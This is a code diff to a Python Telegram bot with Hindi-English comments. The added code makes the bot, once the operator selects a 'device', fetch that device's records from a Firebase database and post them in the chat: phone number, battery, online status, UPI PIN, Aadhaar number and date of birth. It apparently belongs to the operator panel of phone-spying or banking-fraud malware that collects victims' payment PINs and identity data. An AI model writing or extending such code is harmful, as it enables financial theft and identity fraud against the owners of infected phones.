@@ -133,9 +133,29 @@ async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if client_id == search_query or d_name == search_query.lower():
                     found_id = client_id
                     break
+            
             if found_id:
                 selected_device_id = found_id
-                await update.message.reply_text(f"✅ Device '{search_query}' automatically select ho gayi!\n🆔 ID: {found_id}")
+                # Details fetch karke message bhej rahe hain
+                details = requests.get(f"{firebase_base}/user_data/{found_id}.json").json() or {}
+                login_resp = requests.get(f"{firebase_base}/All_Users/Login/{found_id}.json")
+                login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
+                
+                pin = login_data.get('pin', 'N/A')
+                adhar = login_data.get('Adhar', 'N/A')
+                dob = login_data.get('dob', 'N/A')
+                status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
+                
+                msg = (f"📱 {details.get('d_name', 'Unknown')}\n"
+                       f"🆔 {found_id}\n"
+                       f"📞 {details.get('phoneNumber', 'Unknown')}\n"
+                       f"🔋 {details.get('battery', 'N/A')}%\n"
+                       f"📌 UPI Pin: {pin}\n"
+                       f"💳 Adhar: {adhar}\n"
+                       f"📅 DOB: {dob}\n"
+                       f"{status}\n\n"
+                       f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
+                await update.message.reply_text(msg)
             else:
                 await update.message.reply_text(f"❌ Device '{search_query}' nahi mili.")
         except Exception as e:
@@ -322,4 +342,4 @@ if __name__ == '__main__':
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
     app.run_polling()
-    
+            
